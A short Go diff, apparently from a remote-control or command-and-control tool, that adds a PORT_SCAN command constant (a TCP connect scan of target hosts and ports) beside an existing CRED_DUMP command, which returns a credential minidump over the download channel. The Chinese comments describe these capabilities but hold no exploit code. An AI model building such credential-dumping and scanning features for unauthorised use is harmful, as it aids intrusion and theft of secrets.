@@ -152,4 +152,8 @@ const (
 	// 客户端把制品落到临时目录并**经下载通道回传**（复用 v2 下载协议，不新增回传通道），
 	// 服务端按 fileName 匹配到本次请求后校验 minidump 头并登记为制品。
 	CRED_DUMP = 130
+
+	// 端口扫描（阶段三）：cmdBuf = "<targets> <ports> [timeoutMs]"。
+	// 客户端用 TCP connect 扫描（跨平台、无需 raw socket），结果按主机聚合回显。
+	PORT_SCAN = 131
 )
